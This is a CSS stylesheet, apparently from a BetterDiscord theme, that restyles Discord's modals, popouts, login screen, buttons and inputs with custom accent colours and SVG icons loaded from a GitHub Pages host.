.attachment-33OFj0 .icon-1kp3fr + *::before,
.audioMetadata-3zOuGv > *:first-child::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_details.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.unknown-3TPTMr::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/common/empty.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="acrobat"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.acrobat-3K1PC6::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_acrobat_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ae"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ae-1Y5Jq3::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_ae_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ai"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ai-11KAaB::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_ai_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="archive"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.archive-2hqXug::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_archive_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="audio"] + *::after,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr.audio-14DQXq::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_audio_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="code"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.code-aoB-kL::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.two-3BBQI9::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_code_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="document"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.document-2cvI0u::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.three-27ScFD::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_document_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="photoshop"] + *::after,
.attachment-33OFj0 .icon-1kp3fr[title="ps"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.photoshop-1UWfyZ::after,
.uploadModal-2ifh8j .icon-kyxXVr.ps-2T6Jrl::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_photoshop_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="sketch"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.sketch-ZMuo7D::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_sketch_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="spreadsheet"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.spreadsheet-1QuSej::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.one-2crnLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_spreadsheet_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="video"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.video-27RLEH::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_video_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="webcode"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.webcode-22GGLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_webcode_accent.svg) center/contain no-repeat;
}

/* ----		10.5.	KEYBOARDSHORTCUTSMODAL			---- */

.ddrArrows-lSnH7P .arrow-2enltQ,							/* modal				arrows								*/
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	height: 50px;
	width: 50px;
}
.ddrArrows-lSnH7P .arrow-2enltQ.active-2X6Ewx {
	filter: brightness(130%);
}
.ddrArrows-lSnH7P .arrow-2enltQ {
	position: relative;
	animation: none !important;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/keybinds_arrows_bg.svg) center/contain no-repeat !important;
}
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	content: "";
	position: absolute;
	top: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/keybinds_arrows_accent.svg) center/contain no-repeat;
}
.ddrArrows-lSnH7P .arrow-2enltQ.down-2Ju7Q_ {
	transform: rotate(270deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.up-fkTose {
	transform: rotate(90deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.right-1AEPK3 {
	transform: rotate(180deg);
}


/* ----		10.6.	LOGINSCREEN						---- */

.authBox-hW6HRx a {											/* authobox				links								*/
	color: rgb(var(--vaccentcolor));
}

.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/login_authbox_bg.svg) center/cover no-repeat;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + *::before {
	content: "";
	position: absolute;
	top: -107px;
	width: 124px;
	height: 84px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/login_authbox_mask.svg) center/cover no-repeat;
}

.startOverButton-3q0wUV {									/* authobox				startover								*/
	color: rgb(var(--vaccentcolor));
}

/* ----		10.7.	DOWNLOADAPPMODAL				---- */

.downloadApps-wbBFdZ .footer-1nkeBm a {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ {
	border-color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ p {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ .downloadButton-1bWXpg {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ {
	background: rgb(var(--vaccentcolor));
	-webkit-mask-size: cover;
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.apple-1fKN59 {
	-webkit-mask: url(https://discordapp.com/assets/7ddab19e24325212299490c2f413b122.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.windows-29yOum {
	-webkit-mask: url(https://discordapp.com/assets/37ce528f3abf4d735a624309e990acc6.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.linux-15cW1y {
	-webkit-mask: url(https://discordapp.com/assets/f8e3f6e7b2cf5f10aed43243560a1b91.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.ios-Z7K-rr {
	-webkit-mask: url(https://discordapp.com/assets/00a1b0447f0474ecaa767a4bc09fe2ed.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.android-gGrHJu {
	-webkit-mask: url(https://discordapp.com/assets/676bfec9f4343f6fcdf0a12ae313a3de.svg);
}

.browserItem-1mKMYK:hover {
	border-color: rgb(var(--vaccentcolor));
}
.browserItem-1mKMYK:hover .btn-3wPLTq {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}

/* ----		10.8.	GUILDBOOSTMODAL					---- */

															/* modal				boost header						*/
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] {
	object-position: -999999px -999999px;
	width: 96px;
	height: 60px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg),
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + * {
	position: relative;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg)::after,
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + *::after {
	content: "";
	position: absolute;
	top: -132px;
	left: calc((100% - 96px) / 2);
	width: 96px;
	height: 60px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
.badgeIconWithSubscribers-3PlMu9 {							/* modal				sub badge icon						*/
	color: rgb(var(--vaccentcolor2));
}
#app-mount .icon-QVoPRH {									/* modal				perkicon general					*/
	color: rgb(var(--vaccentcolor2));
}
															/* modal				tiermarker in progress tier3		*/
#app-mount .tierMarkerInProgress-24LMzJ .currentTierIcon-2gcTCn.tier3Icon-Ku4Ahe {
	color: rgb(var(--vaccentcolor2));
}
.tierMarkerAccomplished-2MiXeg {							/* modal				tiermarker accomplished				*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.7)) !important;
}
#app-mount .barForeground-3KglC8 {							/* modal				tierbarfill							*/
	background-color: rgb(var(--vaccentcolor2));
}
#app-mount .barSecondary-3B1aP2 {							/* modal				previewbarfill						*/
	background: var(--interactive-hover) linear-gradient(90deg, rgba(var(--vaccentcolor2), 0.3), rgba(var(--vaccentcolor2), 0.3));
}
#app-mount .iconIncluded-24npcq {							/* modal				included perkicon					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .upload-2-2ZMI {									/* modal				perkicon upload						*/
	color: rgb(var(--vaccentcolor2));
}
#app-mount .animated-XlVkOl {								/* modal				perkicon animated					*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
#app-mount .stream-3mNTxK {									/* modal				perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
#app-mount .tierUnlocked-25K6Kv {							/* modal				tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlocked-1n-OTI {						/* modal				tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}
.wrapper-3nSjSv {											/* modal				boostaddwrapper						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}
.wrapper-3nSjSv::before,									/* modal				boostangel							*/
.wrapper-3nSjSv::after {
	content: "";
	position: absolute;
	top: -44px;
	right: -82px;
	width: 168px;
	height: 88px;
	pointer-events: none;
}
.wrapper-3nSjSv::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostangel_bg.svg) center/cover no-repeat;
}
.wrapper-3nSjSv::after {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostangel_accent.svg) center/cover no-repeat;
}
#app-mount .wrapper-3nSjSv .lookInverted-2D7oAl.colorBrand-3pXr91 {
	color: rgb(var(--vaccentcolor2)) !important;
}
.tierMarkerLabelPlusIcon-1OS7E9 {							/* modal				prebuy icon							*/
	color: rgb(var(--vaccentcolor2));
}
.upsellFooterIcon-2105bD path {								/* prebuy popout		footer icon							*/
	fill: rgb(var(--vaccentcolor));
}
.perkIconGuild-KLNhuR {										/* prebuy popout		perkicon guild						*/
	color: rgb(var(--vaccentcolor2));
}
.perkIconChatPerks-BnKNFh {									/* prebuy popout		perkicon chat						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}
.perkIconStream-7wqAvn {									/* prebuy popout		perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}

/* ----		10.9.	STREAMSETTINGSMODAL				---- */

.selectorButtonSelected-336oUc,								/* modal				selectorselectedbutton				*/
.selectorButtonSelected-1j4DmC {
	background-color: rgb(var(--vaccentcolor));
}
.badgeUpgrade-1DzdNZ {										/* modal				badgeupgrade						*/
	color: rgb(var(--vaccentcolor));
}
.imageSelected-4Kl81J {										/* modal				imageselected						*/
	border-color: rgb(var(--vaccentcolor));
}
.tile-2silOL:hover .sourceThumbnail-14Iubx {				/* modal				sourcethumbnail						*/
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-14Iubx.selected-3Qtv-u {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}

/* ----		10.10.	DISPATCHERRORMODAL				---- */

.theme-light .closeLink-2MRAUp {							/* modal				closelink							*/
	color: rgb(var(--vaccentcolor));
}

/* ----		10.11.	CHANGELOGMODAL					---- */

.content-s2SEQO a {											/* modal				link								*/
	color: var(--text-link);
}
.improved-1NJK-y {											/* modal				improved category					*/
	color: rgb(var(--vaccentcolor));
}
.improved-1NJK-y::after {
	background-color: rgb(var(--vaccentcolor));
}

.premiumBanner-rP6H1S {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

/* ----		10.12.	SCREENSHAREMODAL				---- */

.tile-2w4k5N:hover .sourceThumbnail-27dolk {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-27dolk.selected-1nOkyc {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.selectorButton-EEUWed:not(.selectorButtonPremiumRequired-mKMbIu):hover {
	background-color: rgb(var(--vaccentcolor));
}
.selectorButtonSelected-t5V9On {
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.13.	PHONEVERIFICATIONMODAL			---- */

.phoneVerificationModal-OzcDc3 path[fill="rgb(118,134,177)"] {
	fill: rgb(var(--vaccentcolor));
}

/* ----		10.14.	CUSTOMSTATUSMODAL				---- */

.art-347BZj {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/customstatus_header_bg.svg) center/contain no-repeat;
}
.art-347BZj::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/customstatus_header_accent.svg) center/contain no-repeat;
}


/* ~~~~		11.		POPOUTS							~~~~ */

.popoutLeft-3aViER.arrowAlignmentTop-1yftWI::before {
	border-left-color: #rgb(var(--vaccentcolor));
}
.popoutRight-1veHKi.arrowAlignmentTop-1yftWI::before {
	border-right-color: #rgb(var(--vaccentcolor));
}
.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentTop-1yftWI::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentTop-1yftWI::before {
	border-top-color: #rgb(var(--vaccentcolor));
}
.theme-light.contentNarrowMedia-W7SHxH.topArrow-1B63md::before,
.theme-light .contentNarrowNoMedia-Il01H1.topArrow-1B63md::before,
.theme-light.contentWideNoMedia-22TIu6.topArrow-1B63md::before,
.theme-light .contentWideNoMedia-22TIu6.topArrow-1B63md::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}

/* ----		11.1.	CONTEXTMENU						---- */

.colorBrand-ROmMP1,											/* contextmenu			brand								*/
.colorDefault-2K3EoJ:not(.focused-3afm-j)[id="user-settings-cog-Discord_Nitro"] {
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO,										/* contextmenu			premium								*/
.colorDefault-2K3EoJ:not(.focused-3afm-j)[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ:not(.focused-3afm-j)[id="guild-context-guild-settings--GUILD_PREMIUM"] {
	color: rgb(var(--vaccentcolor2));
}
.colorDefault-2K3EoJ.focused-3afm-j,
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O),
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) {
	background-color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO.focused-3afm-j,
.colorPremium-p4p7qO:hover:not(.hideInteraction-1iHO1O),
.colorPremium-p4p7qO:active:not(.hideInteraction-1iHO1O),
.colorDefault-2K3EoJ.focused-3afm-j[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O)[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O)[id="user-settings-cog-Nitro_Server_Boost"],
.colorDefault-2K3EoJ.focused-3afm-j[id="guild-context-guild-settings--GUILD_PREMIUM"],
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O)[id="guild-context-guild-settings--GUILD_PREMIUM"],
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O)[id="guild-context-guild-settings--GUILD_PREMIUM"] {
	background-color: rgb(var(--vaccentcolor2));
}
.colorDanger-2qLCe1.focused-3afm-j,
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O),
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) {
	background-color: #F04747;
}
.colorDefault-2K3EoJ .radioSelection-1HmrQS {				/* contextmenu			radioselection						*/
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO .radioSelection-1HmrQS {
	color: rgb(var(--vaccentcolor2));
}
.colorDanger-2qLCe1 .radioSelection-1HmrQS {
	color: #F04747;
}
.colorDefault-2K3EoJ .checkbox-3s5GYZ {						/* contextmenu			checkbox							*/
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO .checkbox-3s5GYZ {
	color: rgb(var(--vaccentcolor2));
}
.colorDanger-2qLCe1 .checkbox-3s5GYZ {
	color: #F04747;
}
.colorDefault-2K3EoJ.focused-3afm-j .check-1JyqgN,			/* contextmenu			checkmark							*/
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: rgb(var(--vaccentcolor));
}
.colorPremium-p4p7qO.focused-3afm-j .check-1JyqgN,
.colorPremium-p4p7qO:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorPremium-p4p7qO:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1.focused-3afm-j .check-1JyqgN,
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: #F04747;
}
.icon-LYJorE {												/* contextmenu			icon								*/
	color: currentColor !important;
}

/* ----		11.2.	USERPOPOUT						---- */

.headerPlaying-j0WQBV {
	background: rgb(var(--vaccentcolor));
}
.headerStreaming-2FjmGz {
	background: #593695;
}

/* ----		11.3.	EMOJIPICKER						---- */

.emojiPicker-3m1S-j .categories-1feg4n .selected-39BZ4S {	/* emojipicker			selected category					*/
	border-bottom-color: rgb(var(--vaccentcolor));
}

/* ----		11.4.	PINS/MENTIONS					---- */

.hasMoreButton-1MELpI {										/* popout				hasmore button						*/
	color: rgb(var(--vaccentcolor));
}

/* ----		11.5.	SEARCHPOPOUT					---- */
															/* datepicker			day hover							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected:hover,
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day:not(.react-datepicker__day--disabled):hover {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			day selectd							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected::after {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			hintvalue							*/
#app-mount .datePicker--XZbmJ .datePickerHint-3Q1Udw .hintValue-29ny8Z {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		12.		GENERAL							~~~~ */

.wanderingCubesItem-WPXqao {								/* loading				cubes								*/
	background-color: rgb(var(--vaccentcolor));
}
.chasingDotsItem-2DVNUn {									/* loading				dots								*/
	background-color: rgb(var(--vaccentcolor));
}
.theme-light .path-92Hmty,									/* loading				circle								*/
.theme-dark .path-92Hmty,
.theme-dark .path2-1q7bG_ {
	stroke: rgb(var(--vaccentcolor));
}

/* ----		12.1.	TEXT							---- */

.brand-2-tkdo {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2tjs5J {
	color: rgb(var(--vaccentcolor));
}
.tipTitle-GL9qAt {
	color: rgb(var(--vaccentcolor));
}

/* ----		12.2.	BUTTONS							---- */

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 .spinnerItem-3GlVyU {
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .btn-1PnLxm.btnPrimary-1jluZW:hover:not(:disabled),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):hover,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background: var(--vaccentcolor-hover);
}
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):active,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background: var(--vaccentcolor-active);
}
#app-mount .btn-1PnLxm.btnPrimary-1jluZW,
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):disabled {
	background: rgb(var(--vaccentcolor));
}

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:hover,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:active,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91,
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:disabled {
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:hover,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	border-color: rgba(var(--vaccentcolor), 0.6);
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:active,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:disabled {
	border-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:hover,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.15);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:active,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-color: rgba(var(--vaccentcolor), 0.2);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:disabled {
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 {
	color: rgb(var(--vaccentcolor));
}
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91:hover .contents-18-Yxp,
#app-mount .lookLink-9FtZy-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover .contents-18-Yxp {
	background-image: linear-gradient(0deg, transparent, transparent 1px, rgb(var(--vaccentcolor)) 0, rgb(var(--vaccentcolor)) 2px, transparent 0);
	color: rgb(var(--vaccentcolor));
}

/* ----		12.3.	INPUTS							---- */

.input-cIJ7To.focused-1mmYsC,								/* textinput			focused								*/
.input-cIJ7To:focus {
	border-color: rgb(var(--vaccentcolor));
}
.input-cIJ7To.error-2O5WFJ {
	border-color: #f04747;
}
.input-cIJ7To.success-2-F980 {
	border-color: #43b581;
}
.focused-1mmYsC {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .prefixInput-14nUik.focused-2QzoMt {
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked 							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe .checkboxElement-1qV33p:checked + span {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked alt							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe.alt-6FvZrq .checkboxElement-1qV33p:checked + span::after {
	border-color: rgb(var(--vaccentcolor));
}

.checkbox-1ix_J3.checked-3_4uQ9[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.checkbox-1ix_J3.checked-3_4uQ9[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.container-3auIfb {											/* switch				unchecked							*/
	background-color: rgb(114, 118, 125) !important;
	transition: background-color .1s ease-out;
}															/* switch				checked								*/
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:hover,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:hover {
	background: var(--vaccentcolor-hover);
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:active,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:active {
	background: var(--vaccentcolor-active);
}
.container-3auIfb path[fill] {
	fill: rgb(114, 118, 125) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"] path[fill],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] path[fill] {
	fill: rgb(var(--vaccentcolor)) !important;
}

.barFill-23-gu- {											/* slider				barfill								*/
	background: rgb(var(--vaccentcolor));
}
